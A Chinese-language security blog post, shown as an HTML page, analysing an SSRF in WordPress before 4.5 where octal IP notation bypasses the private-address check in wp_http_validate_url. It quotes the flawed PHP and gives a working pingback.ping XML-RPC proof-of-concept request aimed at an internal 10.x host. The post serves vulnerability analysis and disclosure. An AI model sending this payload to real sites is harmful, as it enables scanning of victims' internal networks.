@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="概述前几天，wordpress爆出一个SSRF的漏洞，跟进一下，查阅了一下，网上并没有详细的利用方式。以前也没怎么接触过wordpress，看了一下受影响的代码，记录一下过程。">
+<meta name="keywords" content="cms">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【Code Analysis】wordpress SSRF &lt;4.5">
+<meta property="og:url" content="http://blog.0kami.cn/2016/08/19/old-wordpress-ssrf-4-4-2/index.html">
+<meta property="og:site_name" content="0kami&#39;s Blog">
+<meta property="og:description" content="概述前几天，wordpress爆出一个SSRF的漏洞，跟进一下，查阅了一下，网上并没有详细的利用方式。以前也没怎么接触过wordpress，看了一下受影响的代码，记录一下过程。">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://blog.0kami.cn/img/wordpress_ssrf_4_4_2/wordpress-ssrf.png">
+<meta property="og:updated_time" content="2018-01-25T07:32:42.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【Code Analysis】wordpress SSRF &lt;4.5">
+<meta name="twitter:description" content="概述前几天，wordpress爆出一个SSRF的漏洞，跟进一下，查阅了一下，网上并没有详细的利用方式。以前也没怎么接触过wordpress，看了一下受影响的代码，记录一下过程。">
+<meta name="twitter:image" content="http://blog.0kami.cn/img/wordpress_ssrf_4_4_2/wordpress-ssrf.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>【Code Analysis】wordpress SSRF &lt;4.5</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories/notes/">Notes</a></li>
+         
+          <li><a href="/categories/codereview/">CodeReview</a></li>
+         
+          <li><a href="/categories/ctf/">CTF</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2016/08/20/old-how-to-install-drozer-on-mac/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2016/07/04/old-file-upload/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://blog.0kami.cn/2016/08/19/old-wordpress-ssrf-4-4-2/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://blog.0kami.cn/2016/08/19/old-wordpress-ssrf-4-4-2/&text=【Code Analysis】wordpress SSRF &lt;4.5"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://blog.0kami.cn/2016/08/19/old-wordpress-ssrf-4-4-2/&title=【Code Analysis】wordpress SSRF &lt;4.5"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.0kami.cn/2016/08/19/old-wordpress-ssrf-4-4-2/&is_video=false&description=【Code Analysis】wordpress SSRF &lt;4.5"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=【Code Analysis】wordpress SSRF &lt;4.5&body=Check out this article: http://blog.0kami.cn/2016/08/19/old-wordpress-ssrf-4-4-2/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://blog.0kami.cn/2016/08/19/old-wordpress-ssrf-4-4-2/&title=【Code Analysis】wordpress SSRF &lt;4.5"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://blog.0kami.cn/2016/08/19/old-wordpress-ssrf-4-4-2/&title=【Code Analysis】wordpress SSRF &lt;4.5"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://blog.0kami.cn/2016/08/19/old-wordpress-ssrf-4-4-2/&title=【Code Analysis】wordpress SSRF &lt;4.5"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://blog.0kami.cn/2016/08/19/old-wordpress-ssrf-4-4-2/&title=【Code Analysis】wordpress SSRF &lt;4.5"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://blog.0kami.cn/2016/08/19/old-wordpress-ssrf-4-4-2/&name=【Code Analysis】wordpress SSRF &lt;4.5&description=&lt;h3 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h3&gt;&lt;p&gt;前几天，wordpress爆出一个SSRF的漏洞，跟进一下，查阅了一下，网上并没有详细的利用方式。以前也没怎么接触过wordpress，看了一下受影响的代码，记录一下过程。&lt;br&gt;"><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#概述"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ip地址的几种表示方式"><span class="toc-number">2.</span> <span class="toc-text">ip地址的几种表示方式</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#常见的ip地址域名表示方法"><span class="toc-number">2.0.0.1.</span> <span class="toc-text">常见的ip地址域名表示方法</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#非常见ip地址域名表示方法"><span class="toc-number">2.0.0.2.</span> <span class="toc-text">非常见ip地址域名表示方法</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#代码详情"><span class="toc-number">3.</span> <span class="toc-text">代码详情</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用"><span class="toc-number">4.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number"></span> <span class="toc-text">参考</span></a>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        【Code Analysis】wordpress SSRF &lt;4.5
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">0kami's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2016-08-19T07:05:19.000Z" itemprop="datePublished">2016-08-19</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/cms/">cms</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>前几天，wordpress爆出一个SSRF的漏洞，跟进一下，查阅了一下，网上并没有详细的利用方式。以前也没怎么接触过wordpress，看了一下受影响的代码，记录一下过程。<br><a id="more"></a></p>
+<h3 id="ip地址的几种表示方式"><a href="#ip地址的几种表示方式" class="headerlink" title="ip地址的几种表示方式"></a>ip地址的几种表示方式</h3><p>ip地址域名有多种表示方式，浏览器都能识别出来。</p>
+<h6 id="常见的ip地址域名表示方法"><a href="#常见的ip地址域名表示方法" class="headerlink" title="常见的ip地址域名表示方法"></a>常见的ip地址域名表示方法</h6><ul>
+<li>点分十进制表示法，例如192.168.1.2</li>
+<li>二进制表示法例如11000000101010000000000100000010，表示192.168.1.2</li>
+</ul>
+<h6 id="非常见ip地址域名表示方法"><a href="#非常见ip地址域名表示方法" class="headerlink" title="非常见ip地址域名表示方法"></a>非常见ip地址域名表示方法</h6><ul>
+<li>整数型：将上述的二进制直接转换成整数3232235778，浏览器通过访问<a href="http://3232235778" target="_blank" rel="noopener">http://3232235778</a> 解析为192.168.1.2，除此之外还可以通过公式<code>192*256^3+168*256^2+1*256+2=3232235778</code>换算</li>
+<li>八进制型：将IP 192.168.1.2换成8进制0300.0250.01.02，在前面加上0表示8进制</li>
+<li>十六进制型：将IP 192.168.1.2换成16进制0xc0.0xA8.1.2，在前面加上0x表示16进制</li>
+<li>混合型：即以上的几种方式的结合，0300.0xA8.1.0x02</li>
+</ul>
+<p>下面就是通过八进制绕过检测。</p>
+<h3 id="代码详情"><a href="#代码详情" class="headerlink" title="代码详情"></a>代码详情</h3><p>漏洞成因处508 <code>wp_http_validate_url</code> 函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="keyword">if</span> ( ! $same_host ) &#123;</span><br><span class="line">		$host = trim( $parsed_url[<span class="string">'host'</span>], <span class="string">'.'</span> );</span><br><span class="line">		<span class="keyword">if</span> ( preg_match( <span class="string">'#^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;$#'</span>, $host ) ) &#123;</span><br><span class="line">			$ip = $host;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$ip = gethostbyname( $host );</span><br><span class="line">			<span class="keyword">if</span> ( $ip === $host ) <span class="comment">// Error condition for gethostbyname()</span></span><br><span class="line">				$ip = <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ( $ip ) &#123;</span><br><span class="line">			$parts = array_map( <span class="string">'intval'</span>, explode( <span class="string">'.'</span>, $ip ) );</span><br><span class="line">			<span class="keyword">if</span> ( <span class="number">127</span> === $parts[<span class="number">0</span>] || <span class="number">10</span> === $parts[<span class="number">0</span>] || <span class="number">0</span> === $parts[<span class="number">0</span>]</span><br><span class="line">				|| ( <span class="number">172</span> === $parts[<span class="number">0</span>] &amp;&amp; <span class="number">16</span> &lt;= $parts[<span class="number">1</span>] &amp;&amp; <span class="number">31</span> &gt;= $parts[<span class="number">1</span>] )</span><br><span class="line">				|| ( <span class="number">192</span> === $parts[<span class="number">0</span>] &amp;&amp; <span class="number">168</span> === $parts[<span class="number">1</span>] )</span><br><span class="line">			) &#123;</span><br><span class="line">        ......</span><br></pre></td></tr></table></figure></p>
+<p>这里的代码通过正则表达式<code>^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$</code>判断ip是否合法，如果不合法则通过网络获取ip的值。<br>下面的if判断则是用来防止给的url为内网ip，但是上述的正则表达式可以通过8进制绕过内网限制。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="keyword">empty</span>( $parsed_url[<span class="string">'port'</span>] ) )</span><br><span class="line">		<span class="keyword">return</span> $url;</span><br><span class="line"></span><br><span class="line">	$port = $parsed_url[<span class="string">'port'</span>];</span><br><span class="line">	<span class="keyword">if</span> ( <span class="number">80</span> === $port || <span class="number">443</span> === $port || <span class="number">8080</span> === $port )</span><br><span class="line">		<span class="keyword">return</span> $url;</span><br></pre></td></tr></table></figure></p>
+<p>再接下来可以看到程序又对端口做了限制，只能扫描80,443,8080端口。<br>综上所述，通过8进制绕过ip判断，可以扫描内网的80,443,8080<br>找一下调用的位置,可以找到class-wp-xmlrpc-server.php通过wp_safe_remote_get调用了get函数，get函数使用了wp_http_validate_url，从而造成ssrf</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>利用的方式为通过xmlrpc.php中pingback.ping功能来调用这个函数。<br>POC<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /cms/wordpress/wp442/xmlrpc.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 321</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line">&lt;methodName&gt;pingback.ping&lt;/methodName&gt;</span><br><span class="line">&lt;params&gt;</span><br><span class="line">&lt;param&gt;&lt;value&gt;&lt;string&gt;http://012.10.10.111:8080/testvul&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://localhost/cms/wordpress/wp442/2016/08/19/hello-world/&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;</span><br><span class="line">&lt;/params&gt;</span><br><span class="line">&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这里设置10.10.10.111为受害者<br><img src="http://blog.0kami.cn/img/wordpress_ssrf_4_4_2/wordpress-ssrf.png" alt="image"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在测试中发现只能对10.x.x.x的内网ip进行利用，因为正则的原因至多只能有3位数字，一位需要为0来表示8进制，所以利用只有10,并且只能扫描80,443,8080端口。由于利用中不回显，也很难确定是否成功利用。所以这个洞可能危害比较小（太菜了，想不到其他的利用方式，有其他的利用方式记得分享啊！！！）<br>还有一种利用就是开启xmlrpc的wordpress站可以被通过pingback.ping方法来DDOS，这个以前就有人提出来了。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://xlab.baidu.com/wordpress/" target="_blank" rel="noopener">http://xlab.baidu.com/wordpress/</a><br><a href="https://virusdefender.net/index.php/archives/733/" target="_blank" rel="noopener">https://virusdefender.net/index.php/archives/733/</a></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+        </div>
+    </div>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories/notes/">Notes</a></li>
+         
+          <li><a href="/categories/codereview/">CodeReview</a></li>
+         
+          <li><a href="/categories/ctf/">CTF</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#概述"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ip地址的几种表示方式"><span class="toc-number">2.</span> <span class="toc-text">ip地址的几种表示方式</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#常见的ip地址域名表示方法"><span class="toc-number">2.0.0.1.</span> <span class="toc-text">常见的ip地址域名表示方法</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#非常见ip地址域名表示方法"><span class="toc-number">2.0.0.2.</span> <span class="toc-text">非常见ip地址域名表示方法</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#代码详情"><span class="toc-number">3.</span> <span class="toc-text">代码详情</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用"><span class="toc-number">4.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number"></span> <span class="toc-text">参考</span></a>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://blog.0kami.cn/2016/08/19/old-wordpress-ssrf-4-4-2/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://blog.0kami.cn/2016/08/19/old-wordpress-ssrf-4-4-2/&text=【Code Analysis】wordpress SSRF &lt;4.5"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://blog.0kami.cn/2016/08/19/old-wordpress-ssrf-4-4-2/&title=【Code Analysis】wordpress SSRF &lt;4.5"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.0kami.cn/2016/08/19/old-wordpress-ssrf-4-4-2/&is_video=false&description=【Code Analysis】wordpress SSRF &lt;4.5"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=【Code Analysis】wordpress SSRF &lt;4.5&body=Check out this article: http://blog.0kami.cn/2016/08/19/old-wordpress-ssrf-4-4-2/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://blog.0kami.cn/2016/08/19/old-wordpress-ssrf-4-4-2/&title=【Code Analysis】wordpress SSRF &lt;4.5"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://blog.0kami.cn/2016/08/19/old-wordpress-ssrf-4-4-2/&title=【Code Analysis】wordpress SSRF &lt;4.5"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://blog.0kami.cn/2016/08/19/old-wordpress-ssrf-4-4-2/&title=【Code Analysis】wordpress SSRF &lt;4.5"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://blog.0kami.cn/2016/08/19/old-wordpress-ssrf-4-4-2/&title=【Code Analysis】wordpress SSRF &lt;4.5"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://blog.0kami.cn/2016/08/19/old-wordpress-ssrf-4-4-2/&name=【Code Analysis】wordpress SSRF &lt;4.5&description=&lt;h3 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h3&gt;&lt;p&gt;前几天，wordpress爆出一个SSRF的漏洞，跟进一下，查阅了一下，网上并没有详细的利用方式。以前也没怎么接触过wordpress，看了一下受影响的代码，记录一下过程。&lt;br&gt;"><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 0kami
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories/notes/">Notes</a></li>
+         
+          <li><a href="/categories/codereview/">CodeReview</a></li>
+         
+          <li><a href="/categories/ctf/">CTF</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-37473492-6', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = '0kami';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
